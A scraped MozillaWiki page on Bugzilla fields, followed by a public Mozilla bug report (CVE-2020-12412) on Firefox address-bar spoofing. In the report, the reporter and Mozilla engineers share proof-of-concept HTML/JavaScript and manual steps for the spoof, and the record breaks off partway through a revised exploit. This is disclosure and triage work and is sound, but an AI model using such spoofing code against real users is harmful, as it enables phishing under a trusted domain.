=== Content from wiki.mozilla.org_3659d679_20250119_133803.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from bugzilla.mozilla.org_d1637b21_20250119_115217.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1528587)
* [XML](/show_bug.cgi?ctype=xml&id=1528587)

Closed
[Bug 1528587](/show_bug.cgi?id=1528587)
(CVE-2020-12412)

Opened 6 years ago
Closed 5 years ago

# Address bar spoof using history navigation and blocked ports

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Address bar spoof using history navigation and blocked ports

## Categories

### (Core :: DOM: Navigation, defect, P2)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=DOM%3A%20Navigation#DOM%3A%20Navigation)

DOM: Navigation
▾

Core :: DOM: Navigation
For bugs with HTML’s [navigate](https://html.spec.whatwg.org/multipage/browsing-the-web.html#navigate) algorithm and browsing contexts.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Navigation&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Navigation&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=DOM%3A%20Navigation)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P2

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla70

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |
| Webcompat Score | --- |
| Performance Impact | --- |
| Webcompat Priority | --- |
| a11y-review | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr68 | [-](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=-) | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=wontfix) |
| firefox69 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix) |
| firefox70 | [-](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=-) | [fixed](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fixed) |
| firefox71 | [-](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=-) | [fixed](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=fixed) |
| firefox72 | [-](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=-) | [fixed](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fixed) |
| firefox73 | [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr68 | - | wontfix |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox69 |  | wontfix |
| firefox70 | - | fixed |
| firefox71 | - | fixed |
| firefox72 | - | fixed |
| firefox73 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: oess44, Assigned: peterv)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/21a031df69f8c0549475a8cdc06f53f5?d=mm&size=40)  [peterv](/user_profile?user_id=24295)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/ebd289225f34c1fcb5b4030a077b12db?d=mm&size=40)  [oess44](/user_profile?user_id=633720)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/b89a42ca4c4d59c27f33c399bb1ecc7b?d=mm&size=40)  [farre](/user_profile?user_id=566192)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

18 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: csectype-spoof, reporter-external, sec-moderate, Whiteboard: [reporter-external] [client-bounty-form] [verif?])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-12412

[Keywords:](/describekeywords.cgi)

[csectype-spoof](/buglist.cgi?keywords=csectype-spoof&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a34003227_1689 "6 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files, 1 obsolete file)

| [mozilla-firefox.zip](/attachment.cgi?id=9044466)  [6 years ago](#c0)  [Adrian](/user_profile?user_id=633720)   414.92 KB, application/x-zip-compressed |  | [Details](/attachment.cgi?id=9044466&action=edit) |
| --- | --- | --- |
| [poc-video.mp4](/attachment.cgi?id=9047475)  [6 years ago](#c11)  [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)   266.85 KB, video/mp4 |  | [Details](/attachment.cgi?id=9047475&action=edit) |
| [mozilla-report.pdf](/attachment.cgi?id=9047476)  [6 years ago](#c12)  [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903)   216.12 KB, application/pdf |  | [Details](/attachment.cgi?id=9047476&action=edit) |
| [poc-no-user-interaction.mkv](/attachment.cgi?id=9054357)  [6 years ago](#c16)  [Adrian](/user_profile?user_id=633720)   264.38 KB, video/x-matroska |  | [Details](/attachment.cgi?id=9054357&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1528587#c0)• 6 years ago |
|  | |

Attached file
[mozilla-firefox.zip](attachment.cgi?id=9044466) (obsolete)
— [Details](attachment.cgi?id=9044466&action=edit)

Address Bar Spoofing security issue was tested against newest version of Mozilla Firefox. Both Linux and Windows version were behaving the same way which means both of them are vulnerable. I have tested it on 64bit Operating Systems(Ubuntu 16.04 and Windows 7). Client itself was 64bit as well. I have attached zip file containing report with the vulnerability details including poc code and short mp4 video. Please contact me via: oess44@gmail.com. Regards

Flags: sec-bounty?

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1528587#c1)• 6 years ago |
|  | |

Description:

> 1. Victim opens attacker website
> 2. Attacker website opens restricted address such as <https://google.com:1>
>
>    in a new tab
> 3. Attacker website opens another attacker resource such as
>
>    attacker.com/test.html in the previously opened tab(this resource is
>
>    running actual javascript code leading to Address Bar Spoofing)
> 4. Attacker website opens another restricted address such as
>
>    <https://dontdoit.com:1> in the previously opened tab
>
>    When victim clicks back button just few times he will see <https://google.com:1>
>
>    in Address Bar and the content will be attacker controlled.
>
>    Following is a proof of concept html code included:

PoC in the pdf in the zipfile:

attacker.html

```
<!DOCTYPE html>
<html>
<body>
<script>
win=window.open(“https://google.com:1”);
setTimeout(‘win.location=”http://attackerip/test.html”',100);
setTimeout(‘win.location=”https://dontdoit.com:1”',300);
</script>
</body>
</html>

```

test.html

```
<!DOCTYPE html>
<html>
<body>
<p>Hello World</p>
<script>
setTimeout(‘window.history.go(-1); window.history.go(1);’ 500);
</script>
</body>
</html>

```

I haven't tried to reproduce yet because the steps combined with the code don't make a lot of sense to me. What's the relevance of "dontdoit.com" ? And in your testing, does the webpage's history navigation suffice here, or does the user still need to hit the back button themselves?

Component: Security → Address BarFlags: needinfo?(oess44)Summary: Full Address Bar Spoofing has been identified. It is possible to spoof any domain name either with http or https protocol. → Address bar spoof using history navigation and unreachable ports

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1528587#c2)• 6 years ago |
|  | |

Hi,

Methodology used in my attack is based on the fact Firefox is confused when the history chain looks like this:

Restricted Address like <https://google.com:1> -> legit address -> Restricted address like <https://dontdoit.com:1>

The relevance of the "dontdoit.com" is crucial because attack would otherwise not work. Please take a look at the video proof of concept. Answering your last question, user needs to hit the back button themselves. I have tried to automate it to the maximum it seems though that this last steps needs to be performed by victim(he needs to click back button)

If you want to reproduce it manually you can follow these steps:

create test.html

...

<button onclick="poc()">Click me to confuse firefox</button>

<script>

function poc() {

window.history.go(-1);

window.history.go(1);

}

</script>

...

1: type <https://google.com:1> in Address Bar

2: type <http://localhost/test.html> in Address Bar

3: type <https://whatever.com:1> in Address Bar

4: Click back button

5: Click "Click me to confuse firefox" button

6: Click back button

7: Click back button

This is how it can be done manually. You will see that the Address Bar is showing <https://google.com:1> with the attacker controlled content. Most of these steps can be automated however as shown in my first report.

Flags: needinfo?(oess44)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1528587#c3)• 6 years ago |
|  | |

Hi team

Its almost a week with no information from your side. Please let me know if you're working on it. It would be great to get in touch with you, maybe even cooperate in order to fix the issue. I think that the issue I have posted is worth investigation rather than ignoring it. Regards

Flags: needinfo?(mak77)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a324077_633720)• 6 years ago |

CC list accessible: false

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1528587#c4)• 6 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1528587&comment_id=13937835 "1 revision") |
|  | |

(In reply to Adrian from [comment #3](/show_bug.cgi?id=1528587#c3 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> Hi team
>
> Its almost a week with no information from your side

It really hasn't. This was reported just under 4 days ago on bugzilla, and I responded 2 days ago. I don't understand why you think there's been no information.

Please do not make this bugreport inaccessible to people on the CC list again as you did just now (I'm reverting that change). It stops some people (like the person you asked for needinfo...) from seeing the bug / any requests.

I just tried to reproduce the issue and could not. I get an error page when opening <https://google.com:1/> that says:

"This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection."

Are you actually testing on port 1, or did you modify the testcase before submitting without retesting?

CC list accessible: trueFlags: needinfo?(oess44)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1528587#c5)• 6 years ago |
|  | |

> maybe even cooperate in order to fix the issue.

Did you have suggestions? Does the same issue appear in other browsers?

|  | [Marco Bonardo [:mak]](/user_profile?user_id=240353) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1528587#c6)• 6 years ago |
|  | |

Security should flag the right severity of this before we assign a proper priority.

Would you mind attaching the full set of html files ready to reproduce the bug, those would help with QA and with reproducing on other browsers.

Flags: needinfo?(mak77)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1528587#c7)• 6 years ago |
|  | |

There are two files required. The methodology have been already described including how to achieve the goal manually. I will describe it shortly again however.

test1.html

<!DOCTYPE html>

<html>

<body>

<script>

win=window.open("<https://google.com:1>");

setTimeout('win.location="[http://attackerip/test2.html"',100](http://attackerip/test2.html%22%27%2C100));

setTimeout('win.location="[https://whatever.com:1"',300](https://whatever.com:1%22',300));

</script>

</body>

</html>

test2.html

<!DOCTYPE html>

<html>

<body>

<p>Hello World</p>

<script>

setTimeout('window.history.go(-1); window.history.go(1);' 500);

</script>

</body>

</html>

The poc should work like that: Attacker send victim link to the test.html file. This file is opening <https://google.com:1> in a new tab, after 100 ms test2.html is being opened in the same tab and finally another restricted address is opened in the same tab: <https://whatever.com:1>

When user now click back button he will be on test2.html page which is running

setTimeout('window.history.go(-1); window.history.go(1);' 500);

After that when user clicks back button again just few times he will see <https://google.com:1> in Address Bar with the attacker controlled content. Please let me know if you succeeded to reproduce it. I will appreciate any information. Regards

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1528587#c8)• 6 years ago |
|  | |

(In reply to :Gijs (he/him) from [comment #4](/show_bug.cgi?id=1528587#c4 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> I just tried to reproduce the issue and could not. I get an error page when opening <https://google.com:1/> that says:
>
> "This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection."
>
> Are you actually testing on port 1, or did you modify the testcase before submitting without retesting?

Adrian, can you respond to this question please?

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1528587#c9)• 6 years ago |
|  | |

It can be any port which makes firefox returning:

"This address is restricted

This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection."

I have noticed that port number 1 is applicable. Port 123 seems to be right as well. The vulnerability occurs only when we got history chain looking like that: Restricted address -> attacker -> Restricted address. Please try to reproduce it manually first. Previously I have described all the steps required to do it manually. You will then understand correctly my methodology, why am I using two html files, why those ports are used and why history.go methods are used. Answering your last question I have tested it both with port 1 and 123 and it worked.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1528587#c10)• 6 years ago |
|  | |

OK, so the automated testcase with 2 files just doesn't work for me. First of all, there's a comma missing in your `setTimeout` call in `test.html`, but even when I fix that I can't reproduce. I end up with a tab that just knows about google.com:1 and otherdomain.com:1, and nothing else, and shows only error pages. I'm guessing the timings need tweaking.

Anyway, I can reproduce (on beta 66) when using the manual steps. Copying from [comment #2](/show_bug.cgi?id=1528587#c2 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") and fixing up some markup here:

Create test file and serve over http (e.g. localhost):

```
<button onclick="poc()">Click me to confuse firefox</button>
<script>
function poc() {
window.history.go(-1);
window.history.go(1);
}
</script>

```

0. new tab
1. navigate to <https://google.com:1> from the address bar
2. navigate to the test file in the same tab.
3. navigate to <https://whatever.com:1> from the address bar in the same tab.
4. Click back button (now you're back on the test page)
5. Click "Click me to confuse firefox" button in page content. You go forward to whatever.com:1 again.
6. Click back button (now you're back on the test page)
7. Click back button (now you're... still on the test page, but the location bar says you're at google.com:1 )

After these steps, the web console says:

```
> document.baseURI
"http://localhost/blah/blah/blah/blah/testpage.html"

document.location.href
"https://google.com:1/"

```

so docshell is confused. `gBrowser.selectedBrowser.currentURI` also points to google.com:1 . The node principal of the document is correct, as is the parent process browser's idea of the content principal (so no XSS or whatever) - but the current URI and window.location are wrong. So docshell is confused, and the address bar is mirroring that confusion. I'm guessing the error page loads are confusing session history somehow.

:qdot, can you take a look? (bz, olli, if you want to chime in please do)

Group: firefox-core-security → dom-core-securityStatus: UNCONFIRMED → NEWComponent: Address Bar → Document NavigationEver confirmed: trueFlags: needinfo?(oess44) → needinfo?(kyle)Product: Firefox → CoreSummary: Address bar spoof using history navigation and unreachable ports → Address bar spoof using history navigation and blocked ports

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1528587#c11)• 6 years ago |
|  | |

Attached video
[poc-video.mp4](attachment.cgi?id=9047475)
— [Details](attachment.cgi?id=9047475&action=edit)

[Attachment #9044466](/attachment.cgi?id=9044466&action=edit "mozilla-firefox.zip") -
Attachment is obsolete: true

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1528587#c12)• 6 years ago |
|  | |

Attached file
[mozilla-report.pdf](attachment.cgi?id=9047476)
— [Details](attachment.cgi?id=9047476&action=edit)

|  | [Kyle Machulis [:qdot] [:kmachulis] (INACTIVE)](/user_profile?user_id=424719) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a1437873_424719)• 6 years ago |

Flags: needinfo?(kyle)

|  | [Kyle Machulis [:qdot] [:kmachulis] (INACTIVE)](/user_profile?user_id=424719) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1528587#c13)• 6 years ago |
|  | |

Re-ni'ing myself, didn't mean to mark that.

Flags: needinfo?(kyle)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1528587#c14)• 6 years ago |
|  | |

Hi Team,

Have you managed to assign proper severity? According to Firefox Release Calendar a new version is planned to be released in a matter of 7 days. Would be great to know if my finding qualify for CVE or something. Regards

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1528587#c15)• 6 years ago |
|  | |

This bug will definitely not be fixed in next week's release. That's been locked down and in testing for a while.

Keywords: [csectype-spoof](/buglist.cgi?keywords=csectype-spoof&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1528587#c16)• 6 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1528587&comment_id=14018526 "2 revisions") |
|  | |

Attached video
[poc-no-user-interaction.mkv](attachment.cgi?id=9054357)
— [Details](attachment.cgi?id=9054357&action=edit)

Hi Team,

I have developed slightly modified version of my exploit. It turned out there is no user interaction needed at all. This Attack could have been used for a mass pwnage. It is only required victim visits specially crafted website. Please take it into account. I have attached another video with the proof. Following is the code I am using now. The timings is here adjusted to high values just in order to show you each steps. I am using three html files: test.html, test2.html and test3.html

Victim is only required to open test2.html file.

test2.html:

```
<html>
</body>
<script>
    win = window.open("https://google.com:1");
    setTimeout('win.location = "http://localhost/"', 2000);
